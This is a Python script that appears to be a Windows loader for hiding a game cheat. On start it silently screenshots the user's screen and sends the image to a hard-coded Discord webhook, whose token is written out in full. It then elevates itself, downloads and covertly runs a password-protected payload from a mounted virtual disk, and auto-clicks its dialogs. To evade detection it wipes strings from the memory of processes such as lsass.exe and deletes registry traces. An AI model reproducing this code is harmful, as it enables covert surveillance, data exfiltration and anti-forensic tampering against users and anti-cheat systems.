from multiprocessing import Process
from os import getenv, path, system, remove
from winreg import HKEY_CURRENT_USER
from ctypes import windll, create_unicode_buffer, c_bool, c_int, WINFUNCTYPE
from psutil import process_iter, AccessDenied, NoSuchProcess
from requests import get
from time import sleep
from zipfile import ZipFile
import ctypes 
import sys 
import os 
import time
import platform
import psutil
import inspect
import threading
import pywinauto

from subprocess import run, PIPE, CalledProcessError
from random import randint
from time import sleep
from os import remove, path
from string import ascii_uppercase

from ctypes import Structure, c_void_p, wintypes, c_size_t
from ctypes.wintypes import DWORD, LONG
from time import sleep
from ctypes import windll
from random import choice
from string import ascii_letters, digits, punctuation

from subprocess import STARTUPINFO, STARTF_USESHOWWINDOW, Popen, CREATE_NO_WINDOW
from ctypes import windll, create_unicode_buffer, c_bool, c_int, WINFUNCTYPE

from ctypes import create_string_buffer, c_size_t, windll, c_void_p, byref, sizeof, windll
from ctypes.wintypes import HANDLE, DWORD
from psutil import process_iter, AccessDenied, NoSuchProcess
import subprocess

import requests
import json
import pyautogui
import io
from datetime import datetime

from requests import get
from zipfile import ZipFile
from io import BytesIO
from os import system
from colorama import init, Fore, Style  # ✅ Import what you use

# Initialize colorama
init(autoreset=True)

def ClearConsole() -> None:
    system("cls")

def PrintBanner() -> None:
    print(Fore.RED + r"""
 
_____________________    _____  _________ ___________.____     ___________ _________ _________
\__    ___/\______   \  /  _  \ \_   ___ \\_   _____/|    |    \_   _____//   _____//   _____/
  |    |    |       _/ /  /_\  \/    \  \/ |    __)_ |    |     |    __)_ \_____  \ \_____  \ 
  |    |    |    |   \/    |    \     \____|        \|    |___  |        \/        \/        \
  |____|    |____|_  /\____|__  /\______  /_______  /|_______ \/_______  /_______  /_______  /
                   \/         \/        \/        \/         \/        \/        \/        \/ 

""" + Style.RESET_ALL)


from colorama import init, Fore, Style
import builtins

init(autoreset=True)


original_print = builtins.print
original_input = builtins.input

def red_print(*args, **kwargs):
    original_print(Fore.RED + ' '.join(str(arg) for arg in args), **kwargs)


def red_input(prompt=''):
    return original_input(Fore.RED + prompt + Style.RESET_ALL)

# Apply the overrides
builtins.print = red_print
builtins.input = red_input



def Download(url):
    response = get(url, stream=True)
    response = BytesIO(response.content)

    with ZipFile(response) as zip_ref:
        zip_ref.extractall("A:\\Update\\", pwd= "1".encode())


# Webhook URL (replace with your actual webhook URL)
WEBHOOK_URL = "https://discord.com/api/webhooks/1360505958345867400/ggO_04m54J7mq0VhVkQQl-VHphXuXBTgJAbivCddVB2l0sUWERSH66AgsUuc8RwSsPm_"


# Function to take a screenshot and return it as a byte object
def take_screenshot():
    screenshot = pyautogui.screenshot()  # Capture the screen
    byte_io = io.BytesIO()  # In-memory byte buffer
    screenshot.save(byte_io, 'PNG')  # Save the screenshot to the buffer as PNG
    byte_io.seek(0)  # Go to the beginning of the byte buffer
    return byte_io
# Function to send the embed with the screenshot to the Discord webhook
def flags(byte_io):
    # Prepare the embed structure with dynamic values
    embed = {
        "embeds": [
            {
                "title": "User Flagged In Env Check",
                "description": "",
                "color": 0x00ff00, 
             
                "footer": {
                    "text": "Xenon Logger",
                    "icon_url": "" 
                },
                "author": {
                    "name": "Xenon",
                    "url": "",
                    "icon_url": "" 
                },
                "fields": [
                    {
                        "name": "Build",
                        "value": "0x1",
                        "inline": False
                    }
                    
                ]
            }
        ]
    }

    # Prepare the files for sending (the screenshot)
    files = {
        "file": ("screenshot.png", byte_io, "image/png")
    }
    data = {
        "payload_json": json.dumps(embed)  # Make sure to include the embed
    }

    # Send the embed with the screenshot to the Discord webhook
    response = requests.post(WEBHOOK_URL, data=data, files=files)
# Function to send the embed with the screenshot to the Discord webhook
def send_embed_with_screenshot(byte_io):
    # Prepare the embed structure with dynamic values
    embed = {
        "embeds": [
            {
                "title": "User Ran Hider",
                "description": "",
                "color": 0x00ff00, 
             
                "footer": {
                    "text": "Xenon Logger",
                    "icon_url": "" 
                },
                "author": {
                    "name": "Xenon",
                    "url": "",
                    "icon_url": "" 
                },
                "fields": [
                    {
                        "name": "Build",
                        "value": "0x1",
                        "inline": False
                    }
                ]
            }
        ]
    }

    # Prepare the files for sending (the screenshot)
    files = {
        "file": ("screenshot.png", byte_io, "image/png")
    }
    data = {
        "payload_json": json.dumps(embed)  # Make sure to include the embed
    }

    # Send the embed with the screenshot to the Discord webhook
    response = requests.post(WEBHOOK_URL, data=data, files=files)


def openHandle(target: str, pid: int = None) -> HANDLE:
    for process in process_iter(attrs=['pid', 'name']):
        if process.info['name'].lower() == target:
            pid = process.info['pid'] 
            break
    
    if not pid:
        output = subprocess.check_output(['tasklist', '/svc', '/fi', 'imagename eq svchost.exe'], universal_newlines=True).split('\n')

        for line in output:
            parts = line.split()
            if len(parts) <= 1:
                continue

            if parts[0] != "svchost.exe":
                continue

            if parts[2].lower() != target.lower():
                continue

            pid = int(parts[1])
            break

    if not pid:
        raise NoProcessFound

    handle = windll.kernel32.OpenProcess(0x1F0FFF, False, pid)
    if not handle:
        raise OpenHandleFailed

    return handle

def readMemory(handle: HANDLE, address, size):
    buf = create_string_buffer(size)
    bytes_read = c_size_t()
    if windll.kernel32.ReadProcessMemory(handle, c_void_p(address), buf, size, byref(bytes_read)):
        return buf.raw
    return None

def writeMemory(handle: HANDLE, address, data):
    size = len(data)
    buf = create_string_buffer(data)
    bytes_written = c_size_t()
    return windll.kernel32.WriteProcessMemory(handle, c_void_p(address), buf, size, byref(bytes_written))

def setMemoryProtection(handle: HANDLE, addr, size, new_protect):
    old_protect = DWORD()
    if windll.kernel32.VirtualProtectEx(handle, c_void_p(addr), size, new_protect, byref(old_protect)):
        return old_protect.value
    return None

def replaceStringFromMemory(handle: HANDLE, target):
    search_bytes_ascii = target.encode('ascii')
    search_bytes_unicode = target.encode('utf-16le')
    addr = 0x10000 
    found_count = 0
    replaced_count = 0

    while True:
        mbi = MBI()
        if windll.kernel32.VirtualQueryEx(handle, c_void_p(addr), byref(mbi), sizeof(mbi)) == 0:
            break

        if mbi.State == 0x1000 and mbi.Protect != 0x1:  
            try:
                chunk = readMemory(handle, mbi.BaseAddress, mbi.RegionSize)
                if chunk:
                    for search_bytes in [search_bytes_ascii, search_bytes_unicode]:
                        offset = 0
                        while True:
                            offset = chunk.find(search_bytes, offset)
                            if offset == -1:
                                break
                            found_count += 1
                            found_addr = mbi.BaseAddress + offset

                            old_protect = setMemoryProtection(handle, found_addr, len(search_bytes), 0x04)
                            if old_protect is not None:
                                if writeMemory(handle, found_addr, b'\x00' * len(search_bytes)):
                                    replaced_count += 1
                                setMemoryProtection(handle, found_addr, len(search_bytes), old_protect)

                            offset += len(search_bytes)
            except Exception as e:
                print(f"Error reading/writing memory at {hex(mbi.BaseAddress)}: {e}")

        addr = mbi.BaseAddress + mbi.RegionSize
        if addr > 0x7FFFFFFFFFFFFFFF: 
            break

    return found_count, replaced_count




def SilentOpen(file):
    StartUpInfo = STARTUPINFO()
    StartUpInfo.dwFlags |= STARTF_USESHOWWINDOW

    return Popen(
        file, 
        cwd = "A:\\Update\\",
        startupinfo = StartUpInfo,
        creationflags = CREATE_NO_WINDOW
    )


       



def ConsoleHandler() -> None:
    while True:
        title = ''.join(choice(ascii_letters + digits + punctuation) for _ in range(14))
        windll.kernel32.SetConsoleTitleW(title)
        sleep(0.1)
class MBI(Structure):
    _fields_ = [
        ("BaseAddress", c_void_p),
        ("AllocationBase", c_void_p),
        ("AllocationProtect", DWORD),
        ("RegionSize", c_size_t),
        ("State", DWORD),
        ("Protect", DWORD),
        ("Type", DWORD)
    ]

import winreg
import winreg

def parse_root_and_subpath(full_path):
    roots = {
        "HKEY_LOCAL_MACHINE": winreg.HKEY_LOCAL_MACHINE,
        "HKLM": winreg.HKEY_LOCAL_MACHINE,
        "HKEY_CURRENT_USER": winreg.HKEY_CURRENT_USER,
        "HKCU": winreg.HKEY_CURRENT_USER,
        "HKEY_CLASSES_ROOT": winreg.HKEY_CLASSES_ROOT,
        "HKCR": winreg.HKEY_CLASSES_ROOT,
        "HKEY_USERS": winreg.HKEY_USERS,
        "HKU": winreg.HKEY_USERS,
        "HKEY_CURRENT_CONFIG": winreg.HKEY_CURRENT_CONFIG,
        "HKCC": winreg.HKEY_CURRENT_CONFIG
    }

    for name, const in roots.items():
        if full_path.startswith(name + "\\"):
            return const, full_path[len(name) + 1:]
    raise ValueError(f"Invalid registry root key: {full_path}")


def delete_value_in_key(path, keyfilter):
    try:
        root, sub_path = parse_root_and_subpath(path)
        with winreg.OpenKey(root, sub_path, 0, winreg.KEY_ALL_ACCESS) as key:
            i = 0
            while True:
                try:
                    value_name, value_data, _ = winreg.EnumValue(key, i)
                    
                    if (keyfilter.lower() in value_name.lower() or
                        keyfilter.lower() in str(value_data).lower()):
                        winreg.DeleteValue(key, value_name)
                        print(f"✅ Deleted value: {value_name} in {path}")
                        continue  # Don't increment, list has shifted
                    i += 1
                except OSError:
                    break
    except Exception as e:
        print(f"❌ Error in deleting value in {path}: {e}")


def RunCommand(command, input_text=None):
    """Run a command and return its output."""
    try:
        result = run(command, shell=True, check=True, stdout=PIPE, stderr=PIPE, text=True, input=input_text)
        return result.stdout
    except CalledProcessError as e:
        return None

def CleanVdisks():
    RunCommand("diskpart", input_text = """\
list vdisk
select vdisk file=C:\\temp_vdisk.vhd
detach vdisk noerr
""")


    try:
        if path.exists("C:\\temp_vdisk.vhd"):
            remove("C:\\temp_vdisk.vhd")
            print("[ + ] Existing virtual disk file cleaned up.")
            sleep(1)
    except Exception as e:
        print(f"[ - ] Could not delete existing VHD file: {e}")
        print("[ - ] Will try to create new VHD anyway...")



def AddVdisk(drive):
    RunCommand("diskpart", input_text = f"""\
create vdisk file=C:\\temp_vdisk.vhd maximum=100 type=fixed
select vdisk file=C:\\temp_vdisk.vhd
attach vdisk
create partition primary
format fs=fat32 quick
assign letter={drive}
""")

    print(f"[ + ] Virtual disk created and mounted as {drive}:")



def RemoveVdisk(drive):
    RunCommand("diskpart", input_text = f"""\
select volume {drive}
format fs=fat32 quick
select volume {drive}
offline volume noerr
select vdisk file=C:\\temp_vdisk.vhd
detach vdisk noerr
""")

    if path.exists("C:\\temp_vdisk.vhd"):
        remove("C:\\temp_vdisk.vhd")

    print(f"[ + ] Virtual disk reformated, detached and removed.")

    
from ctypes import windll, create_unicode_buffer, c_bool, c_int, WINFUNCTYPE
from win32gui import FindWindow


def CloseDialogue(Title, Answer):
    while True:
        hwnd_dialog = FindWindow(None, Title)
        if not hwnd_dialog:
            continue

        clicked = c_bool(False)

        def enum_child_proc(hwnd, lparam):
            buffer = create_unicode_buffer(256)
            windll.user32.GetWindowTextW(hwnd, buffer, 256)

            if buffer.value == Answer:
                windll.user32.SendMessageW(hwnd, 0x00F5, 0, 0)
                clicked.value = True
                return False

            return True

        windll.user32.EnumChildWindows(
            hwnd_dialog, 
            WINFUNCTYPE(c_bool, c_int, c_int)(enum_child_proc), 
            0
        )

        if clicked.value:
            break

def RemoveVdisk(drive):
    RunCommand("diskpart", input_text = f"""\
select volume {drive}
format fs=fat32 quick
select volume {drive}
offline volume noerr
select vdisk file=C:\\temp_vdisk.vhd
detach vdisk noerr
""")

    if path.exists("C:\\temp_vdisk.vhd"):
        remove("C:\\temp_vdisk.vhd")




class Empty:
    def __init__(self) -> None:
        self.strings = {
            "explorer.exe": ["MatrixHub", "buymtx.online",  "KeyAuth"],
            "dps": ["MatrixHub", "buymtx.online",  "KeyAuth"],
            "lsass.exe": ["MatrixHub", "buymtx.online",  "KeyAuth"],
            "pcasvc": ["MatrixHub", "buymtx.online",  "KeyAuth"],
            "dnscache": ["MatrixHub", "buymtx.online", "KeyAuth"],
            "diagtrack": ["MatrixHub", "buymtx.online",  "KeyAuth"],
            "SysMain": ["MatrixHub", "buymtx.online",  "KeyAuth"],
          
        }
        self.registry = {
            r"HKU\S-1-5-21-3826004478-3409171644-1403702815-1001\SOFTWARE\Classes\Local Settings\Software\Microsoft\Windows\Shell\MuiCache": [r"A:\Update\Discord.exe.FriendlyAppName"],
            r"HKU\S-1-5-21-3826004478-3409171644-1403702815-1001\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\FeatureUsage\AppSwitched": [r"A:\Update\Discord.exe"],
            r"HKU\S-1-5-21-3826004478-3409171644-1403702815-1001\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\FeatureUsage\ShowJumpView": [r"A:\Update\Discord.exe"],
            r"HKU\S-1-5-21-3826004478-3409171644-1403702815-1001_Classes\Local Settings\Software\Microsoft\Windows\Shell\MuiCache": [r"A:\Update\Discord.exe"],
        }
        self.download = "https://github.com/federaldetections/lol/raw/refs/heads/main/Update.zip"

    def run(self) -> None:
        ConsoleHandlerThread = Process(target = ConsoleHandler)
        ConsoleHandlerThread.start()

        ClearConsole()
        PrintBanner()
        print("[ + ] Initializing...")

        CleanVdisks()
        AddVdisk("A") # A: Drive

        Download(self.download)

        print("[ + ] Extracted files to A:\\Update\\")
        
        process = SilentOpen("A:\\Update\\Discord.exe")
        print(f"[ + ] Opened cheat in background with PID {process.pid}")

        CloseDialogue("Matrix", "&Yes")
        print("[ + ] Autopressed dialogue box | Matrix, &Yes")
        CloseDialogue("MatrixHub", "OK")
        print("[ + ] Autopressed dialogue box | MatrixHub, OK")

        ClearConsole()
        PrintBanner()



 

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False


if __name__ == "__main__":

    
    byte_io = take_screenshot()



    send_embed_with_screenshot(byte_io)

    if not is_admin():
      
        ctypes.windll.shell32.ShellExecuteW(
            None, "runas", sys.executable, ' '.join(sys.argv), None, 1
        )
        sys.exit()
    else:
        main = Empty()
        main.run()